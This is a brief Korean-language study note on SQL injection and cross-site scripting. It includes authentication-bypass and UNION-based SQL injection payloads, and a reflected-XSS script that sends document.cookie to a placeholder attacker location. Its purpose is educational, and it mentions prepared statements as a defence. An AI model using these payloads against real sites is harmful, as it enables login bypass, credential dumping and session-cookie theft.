# SQL Injection

> DB에 data request를 보내는 SQL 문을 조작하여 비정상적인 실행을 이끌어내는 공격

> 예시1

    SELECT * FROM accounts WHERE username ='$USERNAME' and password = '$PASSWORD';

    위 SQL문에서 username에 ['or 1=1#]을 대입한다면

    SELECT * FROM accounts WHERE username ='' or 1=1#' and password = '$PASSWORD'; 이 database로 전달되며 이때 username 부분이 or 1=1 으로 모두 참이 되고, 뒷 부분은 모두 주석처리(#)가 되어 궁극적으로 accounts table에 있는 첫 번째 user 정보를 가져오게 되며 주로 첫 번째 user 정보는 admin(관리자)이다.


> 예시2
    
    Union사용
    input: 1' union select user_id, password from users; --

    -> SELECT * FROM accounts WHERE username ='1' union select user_id, password from users; --$USERNAME' and password = '$PASSWORD';

    union 을 이용하여 또 다른 특정 조건없이 모든 user_id와 password에 접근하는 query문을 실행한다, (--는 뒷부분 주석처리)



> SQL Injection 공격은 prepared statement를 사용한다면 쉽게 방어할 수 있다.

# XSS

> XSS는 script code를 insert하여 비정상적인 기능을 실행하는 공격

> Stored XSS: 웹 서버에 script를 저장했다가 누군가 해당 script에 접근했을 때 실행되는데 주로 게시판에 이용된다.

    input: @@@@ <script>공격코드</script>
    output: @@@@
    input에 이런식으로 삽인한다면 output은 내용(@@@@)만 출력되지만 실제로는 script 안에 있는 공격코드도 실행하게 된다.


> Reflected XSS: 요청 메세지에 입력된 script 코드가 즉시 응답 메세지를 통해 출력되는 공격

    input:<script>alert(1)</script>
    output: alert(1)
    1이라는 내용을 가진 alert가 실행된다

    만약 alert안에 1이 아닌 document.cookie가 입력된다면 스크립트 코드로 인해 쿠키값이 출력된다.
    만약 이를 악용한다면
    <script>document.location='http://지정한위치/cookie?'+document.cookie</script> 를 입력한다면 지정한 위치로 사용자의 cookie값을 redirect한다.


> 